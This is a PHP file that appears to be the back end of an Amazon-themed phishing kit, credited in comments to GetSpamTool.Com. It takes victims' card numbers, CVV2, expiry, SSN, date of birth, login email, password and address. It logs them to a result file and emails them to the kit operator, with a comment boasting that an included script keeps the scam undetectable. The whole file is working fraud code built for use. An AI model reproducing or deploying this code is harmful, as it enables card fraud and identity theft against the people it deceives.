<?php
error_reporting(0);
ob_start();
###################################
// Don't change anything here
//Developed and fixed By Walid www.security-Dz.Com
##################################

ini_set("output_buffering",4096);
session_start();


include ('Email.php');

$ip = $_SERVER['REMOTE_ADDR'];

$url="http://www.trouver-ip.com/index.php?ip=".$ip;
$s=file_get_contents($url);
$n=explode('flags/', $s);
$s=explode('.png', $n[1]);
$vcountry=$s[0]; 



$loginemail = $_SESSION['TheEmail'];
$loginpass =  $_SESSION['ThePassword'];
$loginname = $_SESSION['FullNamer'];
$loginaddress = $_SESSION['Address11'];
$logincity = $_SESSION['CityName'];
$loginstate = $_SESSION['StateN'];
$loginzip = $_SESSION['ZipCode'];
$logincountry = $_SESSION['CountryNa'];
$loginphone = $_SESSION['Phone221'];
$loginaddresstype = $_SESSION['AddressTypea'];
$loginpost = $_SESSION['post'];
$loginvalid = $_SESSION['Valid'];
$ip_header = $_SESSION['ip_header'];
$userag = $_SERVER['HTTP_USER_AGENT'];
$hostnm = gethostbyaddr($ip);


$_SESSION['errors'] = $errors=0;


$_SESSION['NameonCards'] = $NameonCards = $_POST['NameonCards'];
$_SESSION['Cardanumber'] = $Cardanumber = $_POST['Cardanumber'];
$_SESSION['CVV2'] = $CVV2 = $_POST['CVV2'];
$_SESSION['Expiredatesss'] = $Expiredatesss = $_POST['Expiredatesss'];
$_SESSION['expdate_year'] = $expdate_year = $_POST['expdate_year'];

$_SESSION['ssn21124'] = $ssn21124 = $_POST['ssn21124'];
$_SESSION['ssn2112455'] = $ssn2112455 = $_POST['ssn2112455'];

$_SESSION['dobday'] = $dobday = $_POST['dobday'];
$_SESSION['dobmonth'] = $dobmonth = $_POST['dobmonth'];
$_SESSION['dobyear'] = $dobyear = $_POST['dobyear'];



if ($NameonCards=="")
{
$NameOncArd=1;
}
else
{
$NameOncArd=0;
}


if ($Cardanumber=="")
{
$CardNumb=1;
}
else
{
$CardNumb=0;
}



$cvv2zen = strlen($CVV2);
if ($cvv2zen<3) 
{
$CVV2C=1;
}
else
{
$CVV2C=0;
}


if ($Expiredatesss=="--")
{
$ExpMonth=1;
}
else
{
$ExpMonth=0;
}




if ($expdate_year=="")
{
$ExpYear=1;
}
else
{
$ExpYear=0;
}



if (($dobmonth!="")&&($dobday!="")&&($dobyear!=""))
{
$Dober=0;
}
else
{
$Dober=1;
}


if ($NameOncArd==1||$CardNumb==1||$CVV2C==1||$ExpMonth==1||$ExpYear==1||$Dober)
{
$errors=1;
}
else{
$errors=0;
}




if ($errors==0)
{

$Playme .="---------------------- Amazon ReZuLt Coded by Unknown------------------------ <br />";
$Playme .="Login : $loginemail<br />";
$Playme .="Password   : $loginpass <br />";
$Playme .="---------------------- Card INFO ------------------------- <br />";
$Playme .="Name On Card: $NameonCards <br />";
$Playme .="Card Number: $Cardanumber <br />";
$Playme .="CVV2: $CVV2 <br />";
$Playme .="Exp.Month: $Expiredatesss <br />";
$Playme .="Exp.Year: $expdate_year <br />";
$Playme .="SSN: $ssn21124 <br />";
$Playme .="VBV: $ssn2112455 <br />";
$Playme .="DOB: $dobday/$dobmonth/$dobyear ( Day - Month - Year ).<br />";
$Playme .="--------------------- Contact INFO ----------------------- <br />";
$Playme .="Name: $loginname <br />";
$Playme .="Address: $loginaddress <br />";
$Playme .="City: $logincity <br />";
$Playme .="State: $loginstate <br />";
$Playme .="ZIP: $loginzip <br />";
$Playme .="Address Type:$loginaddresstype <br />";
$Playme .="Country: $logincountry <br />";
$Playme .="Tel: $loginphone <br />";
$Playme .="Agent: $userag <br />";
$Playme .="Host : $hostnm <br />";
$Playme .="IP: $ip <br />";
$Playme .="------------------------------- Created In 2015 By WwW.GetSpamTool.Com ------------------------ <br />";


// By GetSpamTool.Com
// Join our group in facebook
// https://www.facebook.com/groups/1408786549414123/
include("../Billing_Center/content/javascript_amazon.php"); // Protect your scam and undetectable
$amazon_txt_result = fopen("../amazon_result.html","a");// Send the result in the txt file :)
$get_result = fwrite($amazon_txt_result,$Playme);
fclose($amazon_txt_result);

$allemails = explode("\n", $loginpost."\n".$loginvalid."\n".$userinfo); // Send the result in your email okkkkkkkkkk!
$numemails = count($allemails);
for($x=0; $x<$numemails; $x++){
$to = $allemails[$x];
if ($to){
$to = preg_replace("/ /", "", $to);
$message = preg_replace("/&email&/", $to, $Playme);
$subject = preg_replace("/&email&/", $to, "_Amazon $NameonCards - From: $vcountry _");
flush();
$header = "From: $userinfo\n";
 $header .= "MIME-Version: 1.0\r\n";
 $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
 $header .= "$message\r\n";
 mail($to, $subject, "", $header);
  flush();
 }}

ob_start();
echo '<meta http-equiv="refresh" content="0; url=confirmed.php">';

}

else
{

header("Location: Billing.php?errors=$errors&NameOncArd=$NameOncArd&CardNumb=$CardNumb&CVV2C=$CVV2C&ExpMonth=$ExpMonth&ExpYear=$ExpYear&Dober=$Dober");
}

?>